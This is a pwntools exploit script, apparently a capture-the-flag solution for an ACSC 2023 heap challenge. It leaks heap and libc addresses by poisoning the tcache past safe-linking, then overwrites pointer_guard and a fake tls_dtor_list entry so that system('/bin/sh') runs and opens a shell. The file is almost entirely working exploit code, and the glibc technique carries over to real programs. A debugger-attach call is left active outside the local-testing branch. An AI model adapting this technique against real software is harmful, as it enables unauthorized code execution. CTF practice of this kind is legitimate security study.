#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
ld = ELF('./ld-2.35.so')
if args.LOCAL:
    p = elf.process()
    if args.GDB: 
        context.update(binary=elf, log_level='DEBUG')
        # gdb.attach(p, '''
        #     b *main+64
        #     b *main+215
        #     x/20gx &mlist
        # ''')
else:
    p = remote("", "")

def Edit(idx, size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Size: ', str(int(size)).encode())
    if int(size) != 0:
        p.sendafter(b'Memo: ', data)
    else:
        return

def List():
    p.sendlineafter(b'> ', b'2')
    leak = p.recvuntil(b'MENU')
    leak = leak.split(b'\n')
    return leak

#### [0] leak heap
Edit(0, 0x60, b'A'*0x10)
Edit(0, 0)
Edit(1, 0x60, b'B'*0x10)
Edit(0, 0)
leak = List()
leak = leak[0].split(b' ')
leak = leak[1][::-1].hex()
tcache_perthread_struct = int(leak, 16) << 12
firt_chunk = tcache_perthread_struct + 0x290
log.info('Address tcache_perthread_struct: ' + hex(tcache_perthread_struct))
log.info('Address firt_chunk:              ' + hex(firt_chunk))

#### [1] leak libc | allocated size 0x70 and size 0x80
# 0x70
fd_fake = ((firt_chunk + 0x10) >> 12) ^ (tcache_perthread_struct+0x10)
Edit(0, 0x60, p64(0) * 2)
Edit(0, 0)
Edit(0, 0x60, p64(fd_fake))

# 0x80
Edit(2, 0x70, p64(0)*2)
Edit(2, 0)
Edit(2, 0x70, p64(0)*2)
Edit(2, 0)
Edit(2, 0x70, p64(fd_fake))

# alloc 2 chunk at tcache struct, set bin 0x290 (tcache struct's size) to 7, 
# then if I free one of the two prepared, it will be put into unsorted bin 
# thus lib base can be leaked
Edit(3, 0x60, p64(0))
Edit(4, 0x60, p64(0) + p64(0x200000000))
Edit(5, 0x70, p64(0))
Edit(6, 0x70, p16(0)*0x27 + p16(7))
Edit(4, 0) # delete 4 and size 0x291 is unsortedbins
leak = List()
leak = leak[5].split(b' ')
leak = leak[1][::-1].hex()
libc.address = int(leak, 16) - 0x219ce0
log.info('Address libc base:              ' + hex(libc.address))
gdb.attach(p, '''
    b *main+64
    b *main+215
    x/20gx &mlist
''')

# [2] tls_dtor_list attack
tls_dtor_list = (libc.address - 0x28c0) - 0x58 - 8
pointer_guard = (libc.address - 0x28c0) + 0x30
binsh = 0x00000000001d8698 + libc.address
fake_dtor_list = tcache_perthread_struct + 0xa0
log.info("tls_dtor_list: " + hex(tls_dtor_list))
log.info("pointer_guard: " + hex(pointer_guard))

def left_rotate(data, bit):
    return (data << bit) | (data >> (64 - bit))

Edit(0, 0x78, p16(1) * (0x70//2)) # overwrite tcache->counts
payload = p64(tls_dtor_list) + p64(pointer_guard) 
payload += p64(left_rotate(libc.symbols['system'], 0x11)) + p64(binsh)
Edit(1, 0x78, payload)    # overwrite tcache->entries
Edit(7, 0x20, p64(0))   # overwrite pointer_guard
Edit(8, 0x18, p64(0) + p64(fake_dtor_list))  # point to fake dtor_list
# struct dtor_list
# {
#     dtor_func func;
#     void *obj;
#     struct link_map *map;
#     struct dtor_list *next;
# };

p.sendlineafter(b'> ', b'0')
p.interactive()

# https://sulaidat.github.io/blog/posts/2023-44-28-acsc2023/